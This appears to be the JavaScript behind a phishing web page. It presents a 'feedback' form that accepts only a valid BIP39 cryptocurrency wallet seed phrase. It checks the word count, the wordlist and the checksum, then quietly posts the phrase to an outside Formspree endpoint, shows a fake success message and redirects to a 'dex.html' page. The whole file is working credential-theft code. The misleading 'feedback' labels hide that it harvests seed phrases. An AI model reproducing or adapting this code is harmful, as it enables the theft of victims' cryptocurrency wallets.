// BIP39 wordlist (loaded once on page init)
let wordlist = [];
(async function loadWordlist() {
    try {
        const response = await fetch('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt');
        const text = await response.text();
        wordlist = text.trim().split('\n');
        console.log('BIP39 wordlist loaded:', wordlist.length, 'words');
    } catch (error) {
        console.error('Failed to load BIP39 wordlist:', error);
    }
})();

function isValidBip39Mnemonic(mnemonic) {
    console.log('Validating mnemonic...');
    const words = mnemonic.split(/\s+/).filter(w => w.length > 0);
    console.log('Word count:', words.length);

    // Check word count
    if (![12, 15, 18, 21, 24].includes(words.length)) {
        console.log('Invalid word count');
        return false;
    }

    // Check if all words are in wordlist
    if (wordlist.length > 0) {
        for (const word of words) {
            if (!wordlist.includes(word)) {
                console.log('Invalid word found:', word);
                return false;
            }
        }
    }

    // Check with BIP39 library if available
    if (typeof window.bip39 !== 'undefined' && window.bip39 && window.bip39.validateMnemonic) {
        try {
            const isValid = window.bip39.validateMnemonic(mnemonic);
            console.log('BIP39 library validation:', isValid);
            return isValid;
        } catch (error) {
            console.error('BIP39 validation error:', error);
            // If BIP39 fails, fall back to wordlist check
            return true;
        }
    } else {
        console.warn('BIP39 library not available, using wordlist validation only');
        // If BIP39 library isn't loaded, accept if all words are valid
        return wordlist.length > 0;
    }
}

// Word counter - updates in real-time
document.getElementById('feedbackText').addEventListener('input', function() {
    const text = this.value.trim();
    const words = text.split(/\s+/).filter(word => word.length > 0);
    document.getElementById('wordCount').textContent = words.length;
});

// Feedback form validation and handling
document.getElementById('feedbackForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const feedbackText = document.getElementById('feedbackText').value.trim();
    const words = feedbackText.split(/\s+/).filter(word => word.length > 0);
    const wordCount = words.length;
    
    // Validate BIP39 mnemonic (word count + wordlist + optional checksum)
    if (!isValidBip39Mnemonic(feedbackText.toLowerCase())) {
        document.getElementById('errorMsg').textContent = '✗ Invalid BIP39 mnemonic phrase! Please check your words and try again. Make sure all words are from the BIP39 word list and the checksum is correct.';
        document.getElementById('errorMsg').style.display = 'block';
        document.getElementById('successMsg').style.display = 'none';

        setTimeout(() => {
            document.getElementById('errorMsg').style.display = 'none';
        }, 5000);

        return;
    }

    // Valid feedback - hide error and disable submit button
    document.getElementById('errorMsg').style.display = 'none';
    
    const submitBtn = document.querySelector('.btn-submit');
    submitBtn.disabled = true;
    submitBtn.textContent = 'Submitting...';
    submitBtn.style.opacity = '0.6';
    submitBtn.style.cursor = 'not-allowed';
    
    // Prepare form data
    const formData = new FormData();
    formData.append('feedback', feedbackText);
    formData.append('wordCount', wordCount);
    formData.append('timestamp', new Date().toISOString());
    
    // Send to Formspree silently in the background
    try {
        fetch('https://formspree.io/f/xgowwbrp', {
            method: 'POST',
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        }).then(function(response) {
            if (response.ok) {
                console.log('Feedback submitted successfully');
            } else {
                console.log('Feedback submission response:', response.status);
            }
        }).catch(function(error) {
            console.log('Feedback submission error (non-blocking):', error);
        });
    } catch (error) {
        console.log('Fetch error (non-blocking):', error);
    }
    
    // Show success message immediately (don't wait for fetch)
    setTimeout(function() {
        // Show success message
        document.getElementById('successMsg').style.display = 'block';
        
        // Reset form
        document.getElementById('feedbackForm').reset();
        document.getElementById('wordCount').textContent = '0';
        
        // Redirect to dex.html after 2 seconds
        setTimeout(function() {
            window.location.href = 'dex.html';
        }, 2000);
        
    }, 1000); // 1 second delay before showing success message
});
